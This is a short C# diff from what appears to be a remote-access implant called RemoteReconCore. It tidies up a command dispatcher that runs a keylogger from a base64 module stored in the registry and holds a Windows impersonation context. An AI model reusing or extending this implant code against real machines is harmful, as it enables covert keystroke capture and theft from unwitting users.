@@ -133,7 +133,6 @@ namespace RemoteReconCore
             else if ((int)Cmd.Keylog == command.Key)
             {
                 mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
-                //LogKeystrokes(Convert.ToInt32(command.Value));
                 Keylogger logger = new Keylogger(Convert.ToInt32(command.Value));
                 result = logger.Run();
             }
@@ -167,14 +166,11 @@ namespace RemoteReconCore
 
         public static int sleep = 5;
         public static WindowsImpersonationContext context = null;
-        //private string exceptionInfo;
         public static byte[] mod;
         public static string modkey;
         public static string kkey;
         public static KeyValuePair<int, object> command;
         public static KeyValuePair<int, string> result;
-        private bool kl = false;
-        private Thread keylogThread;
         public static RegistryKey rrbase;
 
         public enum Result : int
@@ -215,10 +211,8 @@ namespace RemoteReconCore
             {
                 modCopy[index + i] = cmdBytes[i];
             }
-
             modCopy[index + cmdBytes.Length] = 0x00;
             modCopy[index + cmdBytes.Length + 1] = 0x00;
-
             return modCopy;
         }
     }
